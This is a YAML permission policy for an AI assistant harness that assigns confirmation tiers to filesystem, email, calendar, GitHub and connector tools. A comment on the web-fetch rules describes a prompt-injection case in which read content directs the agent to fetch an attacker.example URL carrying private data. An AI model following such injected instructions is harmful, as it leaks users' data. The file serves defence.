# Permission policy — DEFAULT classification rules (Feature 003, FR-007).
#
# THIS FILE SHIPS WITH THE PACKAGE. It lives here rather than under
# .omni-harness/ because that directory is runtime state and gitignored — a
# "shipped rule set" that is not in version control does not ship, which CI
# caught by failing every test that asserted against it.
#
# To customise: copy it somewhere writable and point `policy.rules_path` at
# your copy. Editing this file works but is overwritten on upgrade.
#
# THREE THINGS TO KNOW BEFORE EDITING:
#
# 1. A tool matching NO rule here is REFUSED: not offered to the assistant,
#    not run, and listed in the gateway log and on its source in the tool
#    sources view as "No policy rule" (007). It used to be Tier 3 by default,
#    and that default hid rules that matched nothing: the Calendar MCP names
#    its tools `create-event`, the rule said `create_event`, and Calendar
#    writes sat at Tier 3 for months with nobody told. To use a new tool,
#    name it here.
#
#    Names are compared ignoring case and treating `-` and `_` as the same
#    (omniharness/tools/names.py, the one place that normalises), so
#    `googlecalendar_create_event` matches the server's
#    `googlecalendar_create-event`. The MCP server prefix (`<server>_`) is
#    part of the name: rules name `filesystem_read_file`, not `read_file`.
#
# 2. An exception may only RAISE a tier, never lower it (FR-037). Trying to
#    lower one FAILS THE LOAD, naming this file and line — deliberately, so you
#    find out. To make a call safer than its rule's default, change the rule.
#
# 3. If this file cannot be read, EVERY tool is Tier 3. A broken file makes the
#    assistant ask about everything; it never makes it act freely.
#
# Tier 1 = read, silent.  Tier 2 = reversible write, disclosed.
# Tier 3 = irreversible / outbound / spawning — stated, confirmed, then done.

policy:
  rules:
    # ---------------------------------------------------------------------
    # Feature 001 — coding-session watcher. Observe-only by construction:
    # the module offers no way to act on a session, so there is nothing here
    # that could be higher than Tier 1 (FR-010).
    # ---------------------------------------------------------------------
    - pattern: "list_coding_sessions"
      tier: 1
    - pattern: "get_session_status"
      tier: 1
    - pattern: "session-watcher_*"
      tier: 1

    # ---------------------------------------------------------------------
    # Feature 005 — the Project Ledger. Reading is silent. Every write the
    # assistant proposes is stated in full and waits for the user (FR-009):
    # a project the user did not ask for is not "reversible" in any sense
    # that matters to them.
    # ---------------------------------------------------------------------
    - pattern: "ledger_read"
      tier: 1
    - pattern: "ledger_apply"
      tier: 3

    # ---------------------------------------------------------------------
    # Feature 002 — trigger engine. Exposes no agent-callable tools; it
    # injects turns. Listed so the absence is deliberate rather than an
    # oversight, and so a tool added later does not silently inherit Tier 1.
    # ---------------------------------------------------------------------

    # ---------------------------------------------------------------------
    # Built-in tools
    # ---------------------------------------------------------------------
    - pattern: "ask_clarification"
      tier: 1
    - pattern: "view_image"
      tier: 1
    - pattern: "present_files"
      tier: 1
    - pattern: "tool_search"
      tier: 1
    # The agent's own to-do list: it changes only this conversation's state,
    # reaches nothing outside it, and is rewritten freely. Unclassified, it
    # fell to Tier 3, so every to-do update asked for a confirmation, and a
    # confirmation from the card ran it outside the agent, where its state
    # update was lost (found 2026-10-19, Feature 005: promoting to-dos to
    # project tasks never had a list to promote).
    - pattern: "write_todos"
      tier: 1

    # Local reads, listings and metadata. Added 2026-08-25 after enumerating
    # what the lead agent ACTUALLY has: 3 of 39 tools were classified, so
    # everything else fell to the FR-009 default of Tier 3 — including `ls`.
    #
    # A confirmation prompt for a directory listing is how a person learns to
    # approve without reading, which is the failure the tier model exists to
    # prevent. FR-009 was behaving correctly; the rules were not covering the
    # surface.
    #
    # EACH ONE IS NAMED. No `read*` or `*_list*` shortcut: a tool added later
    # must be classified deliberately rather than inherit Tier 1 from a glob
    # that happened to fit, which is the same reasoning as the comment above.
    - pattern: "ls"
      tier: 1
    - pattern: "glob"
      tier: 1
    - pattern: "grep"
      tier: 1
    - pattern: "read_file"
      tier: 1

    # Sandbox mutations, following filesystem_write* (Tier 2). A sandbox write
    # is more contained than one through the MCP server's allowed directories,
    # not less, so it does not warrant a higher tier than its equivalent.
    - pattern: "write_file"
      tier: 2
    - pattern: "str_replace"
      tier: 2

    # Outbound reads: each sends an agent-chosen URL or query off the machine
    # (every provider: ddg/serper/tavily/exa/firecrawl search, jina/exa/
    # firecrawl fetch, image search, all registered under these three names).
    # Tier 1 in a clean turn: a lookup the user asked for creates nothing,
    # modifies nothing and notifies nobody, and a card on every lookup trains
    # approving without reading.
    #
    # Tier 3 once content has entered the turn (`after_content`: the call's
    # origin is not the user's own message: a tool result, an automation's
    # turn, or a cause nobody could tell; app/policy/lineage.py). An email or
    # page the agent read can tell it to fetch
    # https://attacker.example/?d=<private data>, and the fetch IS the leak:
    # the request reaches the attacker's server whatever comes back
    # (zero-click exfiltration, review 4; user decision 2026-10-21). From
    # there the call is a card, confirmable only with its button.
    - pattern: "web_search"
      tier: 1
      exceptions:
        - after_content: true
          tier: 3
    - pattern: "web_fetch"
      tier: 1
      exceptions:
        - after_content: true
          tier: 3
    - pattern: "image_search"
      tier: 1
      exceptions:
        - after_content: true
          tier: 3
    # Starts a preview server in the user's own sandbox — reversible (it can be
    # stopped) and worth mentioning, so Tier 2 rather than silent.
    - pattern: "preview"
      tier: 2
    # Spawns work. Article II names spawning as Tier 3 explicitly.
    - pattern: "task"
      tier: 3
    - pattern: "mcp_build"
      tier: 3

    # Named 007, at the tier they already had through the no-rule default, so
    # naming them changed nothing. Each is a candidate to decide individually.
    #
    # Shell in the CONTAINER sandbox (bash is offered only there): it runs,
    # then is disclosed. Its blast radius is the thread's own folders; its
    # network is the registries proxy (GET/HEAD, 443); its API is keyed (#98)
    # and seccomp-confined (#99). Anything that leaves the sandbox keeps its
    # own rule.
    - pattern: "bash"
      tier: 2
    # Creates or edits a skill: changes what the assistant does in every later
    # conversation, not only this one.
    - pattern: "skill_manage"
      tier: 3
    # Create / update a custom agent's definition (SOUL.md, config).
    - pattern: "setup_agent"
      tier: 3
    - pattern: "update_agent"
      tier: 3

    # ---------------------------------------------------------------------
    # Filesystem — reads are silent, writes are disclosed, deletion is not
    # something to discover after the fact.
    # ---------------------------------------------------------------------
    - pattern: "filesystem_read*"
      tier: 1
    - pattern: "filesystem_list*"
      tier: 1
    # Listing and metadata, named individually for the same reason.
    - pattern: "filesystem_directory_tree"
      tier: 1
    - pattern: "filesystem_get_file_info"
      tier: 1
    - pattern: "filesystem_search_files"
      tier: 1
    # Mutations, matching filesystem_write* rather than the read rules above.
    - pattern: "filesystem_edit_file"
      tier: 2
    - pattern: "filesystem_create_directory"
      tier: 2
    - pattern: "filesystem_write*"
      tier: 2
    - pattern: "filesystem_move*"
      tier: 2
    - pattern: "filesystem_delete*"
      tier: 3

    # ---------------------------------------------------------------------
    # Email (FR-014). Read and draft only — the SEND capability is not
    # classified here because it is ABSENT from the tool surface entirely
    # (FR-012), removed in extensions_config.json. A capability that cannot be
    # reached is a stronger guarantee than one that is guarded, and a draft is
    # its own confirmation gate: nothing leaves until the user sends it.
    # ---------------------------------------------------------------------
    - pattern: "gmail_list*"
      tier: 1
    - pattern: "gmail_read*"
      tier: 1
    - pattern: "gmail_get*"
      tier: 1
    - pattern: "gmail_search*"
      tier: 1
    - pattern: "gmail_create_draft"
      tier: 2
    - pattern: "gmail_update_draft"
      tier: 2
    - pattern: "gmail_delete_draft"
      tier: 2

    # The names the Gmail MCP server (@gongrzhe/server-gmail-autoauth-mcp
    # 1.1.11) ACTUALLY exposes, read from its package 2026-10-20. The draft
    # rules above name tools it does not have; its draft tool is draft_email.
    # Reads (read_email, search_emails, list_email_labels, list_filters,
    # get_filter) are covered by the globs above.
    - pattern: "gmail_draft_email"
      tier: 2
    # `gmail_get*` above makes this Tier 1, but it CREATES a label when none
    # exists. Highest tier wins, so this raises it to a disclosed write.
    - pattern: "gmail_get_or_create_label"
      tier: 2
    # Kept at Tier 3, the tier they had through the no-rule default. Label and
    # archive changes are reversible and could be Tier 2; filters act on future
    # mail by themselves (including forwarding), and deletion is permanent.
    - pattern: "gmail_modify_email"
      tier: 3
    - pattern: "gmail_batch_modify_emails"
      tier: 3
    - pattern: "gmail_delete_email"
      tier: 3
    - pattern: "gmail_batch_delete_emails"
      tier: 3
    - pattern: "gmail_create_label"
      tier: 3
    - pattern: "gmail_update_label"
      tier: 3
    - pattern: "gmail_delete_label"
      tier: 3
    - pattern: "gmail_create_filter"
      tier: 3
    - pattern: "gmail_create_filter_from_template"
      tier: 3
    - pattern: "gmail_delete_filter"
      tier: 3
    # Writes the attachment to local disk.
    - pattern: "gmail_download_attachment"
      tier: 3
    # send_email has NO rule, on purpose: it is denied from the surface
    # (FR-012), and if that deny were ever removed, a tool with no rule is
    # refused rather than defaulted.

    # ---------------------------------------------------------------------
    # Calendar (FR-015). The Google Calendar MCP server
    # (@cocal/google-calendar-mcp 2.7.0) names its tools with HYPHENS:
    # list-calendars, list-events, search-events, get-event, list-colors,
    # get-freebusy, get-current-time, create-event, create-events,
    # update-event, delete-event, respond-to-event, manage-accounts (read from
    # its package, 2026-10-20). Matching ignores the difference.
    # ---------------------------------------------------------------------
    - pattern: "googlecalendar_list*"
      tier: 1
    - pattern: "googlecalendar_search*"
      tier: 1
    - pattern: "googlecalendar_get*"
      tier: 1
    - pattern: "googlecalendar_find*"
      tier: 1
    - pattern: "googlecalendar_freebusy*"
      tier: 1
    # A tentative hold is reversible: the assistant created it and can remove
    # it. "Reversible" is assessed against what the assistant can itself undo.
    - pattern: "googlecalendar_create_event"
      tier: 2
      exceptions:
        # Inviting other people is outbound — it reaches someone else's inbox,
        # which the assistant cannot undo.
        #
        # THE SERVER'S ARGUMENT IS `sendUpdates` (camelCase), not
        # `send_updates`. Argument names are NOT normalised, so the exception
        # below on `send_updates` never fired for this server: once the
        # tool-name fix let `create-event` reach this rule, an invite-sending
        # create would have been Tier 2. Both spellings are listed.
        - when: {sendUpdates: [all, externalOnly]}
          tier: 3
        - when: {send_updates: [all, externalOnly]}
          tier: 3
    # Several events in one call, each with its own `sendUpdates` that an
    # exception cannot see (they are nested). Tier 3.
    - pattern: "googlecalendar_create_events"
      tier: 3
    # Adds or removes the Google accounts the server acts as.
    - pattern: "googlecalendar_manage_accounts"
      tier: 3
    - pattern: "googlecalendar_delete_event"
      tier: 3
    - pattern: "googlecalendar_update_event"
      tier: 3
    - pattern: "googlecalendar_decline*"
      tier: 3
    - pattern: "googlecalendar_respond*"
      tier: 3

    # ---------------------------------------------------------------------
    # GitHub — reads are silent. Same reasoning as the outbound reads above,
    # plus the destination is one the user already authorised with a token.
    # Writes are decided individually further down (no write may rely on a
    # default: an unnamed tool is refused).
    # ---------------------------------------------------------------------
    - pattern: "github_get_file_contents"
      tier: 1
    - pattern: "github_get_issue"
      tier: 1
    - pattern: "github_get_pull_request"
      tier: 1
    - pattern: "github_get_pull_request_comments"
      tier: 1
    - pattern: "github_get_pull_request_files"
      tier: 1
    - pattern: "github_get_pull_request_reviews"
      tier: 1
    - pattern: "github_get_pull_request_status"
      tier: 1
    - pattern: "github_list_commits"
      tier: 1
    - pattern: "github_list_issues"
      tier: 1
    - pattern: "github_list_pull_requests"
      tier: 1
    - pattern: "github_search_code"
      tier: 1
    - pattern: "github_search_issues"
      tier: 1
    - pattern: "github_search_repositories"
      tier: 1
    - pattern: "github_search_users"
      tier: 1

    # ---------------------------------------------------------------------
    # CONNECTOR TOOLS. Composio toolkits arrive as
    # `connector-<slug>_<SLUG>_<ACTION>`, e.g.
    # connector-gmail_GMAIL_FETCH_EMAILS — NOT as `gmail_fetch_emails`.
    #
    # The gmail_* and googlecalendar_* rules above were written against a
    # naming that never occurs on this path, so every connector call fell to
    # the FR-009 default and reading an inbox demanded confirmation. Measured
    # 2026-09-23, after a user asked to check their email and was asked to
    # approve three separate reads.
    #
    # Named individually, as everywhere else: a `connector-gmail_*` glob would
    # silently cover a send capability added to the toolkit later.
    # ---------------------------------------------------------------------
    - pattern: "connector-gmail_GMAIL_FETCH_EMAILS"
      tier: 1
    - pattern: "connector-gmail_GMAIL_FETCH_MESSAGE_BY_MESSAGE_ID"
      tier: 1
    - pattern: "connector-gmail_GMAIL_FETCH_MESSAGE_BY_THREAD_ID"
      tier: 1
    - pattern: "connector-gmail_GMAIL_LIST_THREADS"
      tier: 1
    - pattern: "connector-gmail_GMAIL_LIST_LABELS"
      tier: 1
    - pattern: "connector-gmail_GMAIL_GET_PROFILE"
      tier: 1
    - pattern: "connector-gmail_GMAIL_GET_ATTACHMENT"
      tier: 1
    # A draft is its own confirmation gate: nothing leaves until the user sends
    # it. Disclosed, not gated.
    - pattern: "connector-gmail_GMAIL_CREATE_EMAIL_DRAFT"
      tier: 2
    # Reaches other people's inboxes and cannot be recalled.
    - pattern: "connector-gmail_GMAIL_DELETE_MESSAGE"
      tier: 3
    - pattern: "connector-gmail_GMAIL_MOVE_TO_TRASH"
      tier: 3

    - pattern: "connector-googlecalendar_GOOGLECALENDAR_FIND_EVENT"
      tier: 1
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_LIST_CALENDARS"
      tier: 1
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_GET_CALENDAR"
      tier: 1
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_FIND_FREE_SLOTS"
      tier: 1
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_GET_CURRENT_DATE_TIME"
      tier: 1
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_QUICK_ADD"
      tier: 2
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_CREATE_EVENT"
      tier: 2
      exceptions:
        # Inviting other people is outbound — the assistant cannot un-reach an
        # inbox. Mirrors the googlecalendar_create_event rule above.
        - when: {send_updates: [all, externalOnly]}
          tier: 3
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_UPDATE_EVENT"
      tier: 3
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_DELETE_EVENT"
      tier: 3

    # Composio actions, 007. Every action the installed SDK
    # (composio-core 0.7.21, composio/client/enums/action.pyi, pinned in
    # uv.lock) lists for the four toolkits with ACTIVE connections on this
    # installation: GMAIL, GOOGLECALENDAR, GOOGLEDRIVE, GITHUB. Read from the
    # package on disk, not from Composio's API. Composio serves its "important"
    # subset at run time, which may include an action newer than this list: it
    # has no rule and is refused, and named in the log. Tests:
    # tests/policy/test_connector_rules.py.
    #
    # Tiers by what each action does: reads Tier 1, reversible writes Tier 2,
    # anything that sends, deletes, shares or changes permissions Tier 3, and
    # Tier 3 when unsure.
    - pattern: "connector-gmail_GMAIL_GET_CONTACTS"
      tier: 1
    - pattern: "connector-gmail_GMAIL_GET_PEOPLE"
      tier: 1
    - pattern: "connector-gmail_GMAIL_SEARCH_PEOPLE"
      tier: 1
    - pattern: "connector-gmail_GMAIL_ADD_LABEL_TO_EMAIL"
      tier: 2
    - pattern: "connector-gmail_GMAIL_MODIFY_THREAD_LABELS"
      tier: 2
    - pattern: "connector-gmail_GMAIL_CREATE_LABEL"
      tier: 2
    # Deletes the label itself, not only from one message.
    - pattern: "connector-gmail_GMAIL_REMOVE_LABEL"
      tier: 3
    # GMAIL_SEND_EMAIL and GMAIL_REPLY_TO_THREAD send mail and have NO rule,
    # on purpose: email is read-and-draft only (FR-012, FR-014), and a tool
    # with no rule is refused. That holds even where no `gmail` deny entry in
    # extensions_config removes them from the connector surface (as on the
    # live stack, where they were Tier 3 by the old default).

    # Creates a new calendar; notifies nobody.
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_DUPLICATE_CALENDAR"
      tier: 2
    # Changes an existing calendar's settings; unsure what reaches others.
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_PATCH_CALENDAR"
      tier: 3
    # Notifies the removed attendee.
    - pattern: "connector-googlecalendar_GOOGLECALENDAR_REMOVE_ATTENDEE"
      tier: 3

    - pattern: "connector-googledrive_GOOGLEDRIVE_FIND_FILE"
      tier: 1
    - pattern: "connector-googledrive_GOOGLEDRIVE_FIND_FOLDER"
      tier: 1
    # Tier 1 only if it returns content without writing to disk. The local
    # evidence cannot say which: the installed SDK ships no schema for it
    # (action.pyi lists the name only), its ToolSet saves any output marked
    # `file_downloadable` under ~/.composio/output, and our proxy
    # (composio_mcp_server.py) bypasses the SDK and returns Composio's JSON as
    # is, so whether that JSON is the content or a link to a file is unknown.
    # Unknown, so Tier 2.
    - pattern: "connector-googledrive_GOOGLEDRIVE_DOWNLOAD_FILE"
      tier: 2
    - pattern: "connector-googledrive_GOOGLEDRIVE_PARSE_FILE"
      tier: 1
    # New items in the user's own Drive: reversible, shared with nobody.
    - pattern: "connector-googledrive_GOOGLEDRIVE_CREATE_FILE_FROM_TEXT"
      tier: 2
    - pattern: "connector-googledrive_GOOGLEDRIVE_CREATE_FOLDER"
      tier: 2
    - pattern: "connector-googledrive_GOOGLEDRIVE_UPLOAD_FILE"
      tier: 2
    - pattern: "connector-googledrive_GOOGLEDRIVE_COPY_FILE"
      tier: 2
    # Overwrites an existing file's content: unsure it can be undone.
    - pattern: "connector-googledrive_GOOGLEDRIVE_EDIT_FILE"
      tier: 3
    - pattern: "connector-googledrive_GOOGLEDRIVE_DELETE_FOLDER_OR_FILE"
      tier: 3
    # Sharing: reaches other people and changes who can see a file.
    - pattern: "connector-googledrive_GOOGLEDRIVE_ADD_FILE_SHARING_PREFERENCE"
      tier: 3

    # GITHUB: 952 actions, too many to judge one by one, so the tier follows
    # the action's VERB, one named line per action (no glob: an action added
    # later must be named, not inherited). First word GET, LIST, SEARCH, FETCH
    # or FIND: Tier 1. Anything else: Tier 3 — including reads named another
    # way (GITHUB_ISSUES_GET, GITHUB_CHECK_...). Lowering one is an edit here.
    # EXCEPT: a read whose name contains SECRET, KEY, TOKEN, CREDENTIAL,
    # WEBHOOK, ADMIN, PERMISSION or VARIABLE is Tier 3 (decided 2026-10-20):
    # what it reveals is access or configuration, not content (Actions
    # variables are plaintext and often hold configuration values).
    # GENERATED: the word list and the rule live in
    # tests/policy/github_connector_policy.py, which rewrites these lines;
    # the tests fail if they differ from what it would write.
    - {pattern: "connector-github_GITHUB_ACCEPT_A_REPOSITORY_INVITATION", tier: 3}
    - {pattern: "connector-github_GITHUB_ACTIVITY_LIST_REPO_S_STARRED_BY_AUTHENTICATED_USER", tier: 3}
    - {pattern: "connector-github_GITHUB_ACTIVITY_LIST_STARGAZERS_FOR_REPO", tier: 3}
    - {pattern: "connector-github_GITHUB_ACTIVITY_STAR_REPO_FOR_AUTHENTICATED_USER", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_AN_EMAIL_ADDRESS_FOR_THE_AUTHENTICATED_USER", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_APP_ACCESS_RESTRICTIONS", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_ASSIGNEES_TO_AN_ISSUE", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_A_REPOSITORY_COLLABORATOR", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_A_REPOSITORY_TO_AN_APP_INSTALLATION", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_A_SECURITY_MANAGER_TEAM", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_A_SELECTED_REPOSITORY_TO_A_USER_SECRET", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_CUSTOM_LABELS_TO_A_SELF_HOSTED_RUNNER_FOR_AN_ORGANIZATION", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_CUSTOM_LABELS_TO_A_SELF_HOSTED_RUNNER_FOR_A_REPOSITORY", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_LABELS_TO_AN_ISSUE", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_OR_UPDATE_TEAM_MEMBERSHIP_FOR_A_USER", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_OR_UPDATE_TEAM_MEMBERSHIP_FOR_A_USER_LEGACY", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_OR_UPDATE_TEAM_PROJECT_PERMISSIONS", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_OR_UPDATE_TEAM_PROJECT_PERMISSIONS_LEGACY", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_OR_UPDATE_TEAM_REPOSITORY_PERMISSIONS", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_OR_UPDATE_TEAM_REPOSITORY_PERMISSIONS_LEGACY", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_PROJECT_COLLABORATOR", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_REPO_TO_ORG_SECRET_WITH_SELECTED_ACCESS", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_REPO_TO_ORG_SECRET_WITH_SELECTED_VISIBILITY", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_SELECTED_REPOSITORY_TO_AN_ORGANIZATION_SECRET", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_SELECTED_REPOSITORY_TO_AN_ORGANIZATION_VARIABLE", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_SOCIAL_ACCOUNTS_FOR_THE_AUTHENTICATED_USER", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_STATUS_CHECK_CONTEXTS", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_TEAMS_TO_THE_COPILOT_SUBSCRIPTION_FOR_AN_ORGANIZATION", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_TEAM_ACCESS_RESTRICTIONS", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_TEAM_MEMBER_LEGACY", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_USERS_TO_CODESPACES_ACCESS_FOR_AN_ORGANIZATION", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_USERS_TO_THE_COPILOT_SUBSCRIPTION_FOR_AN_ORGANIZATION", tier: 3}
    - {pattern: "connector-github_GITHUB_ADD_USER_ACCESS_RESTRICTIONS", tier: 3}
    - {pattern: "connector-github_GITHUB_APPROVE_A_WORKFLOW_RUN_FOR_A_FORK_PULL_REQUEST", tier: 3}
    - {pattern: "connector-github_GITHUB_ASSIGN_AN_ORGANIZATION_ROLE_TO_A_TEAM", tier: 3}
    - {pattern: "connector-github_GITHUB_ASSIGN_AN_ORGANIZATION_ROLE_TO_A_USER", tier: 3}
    - {pattern: "connector-github_GITHUB_AUTH_USER_DOCKER_CONFLICT_PACKAGES_LIST", tier: 3}
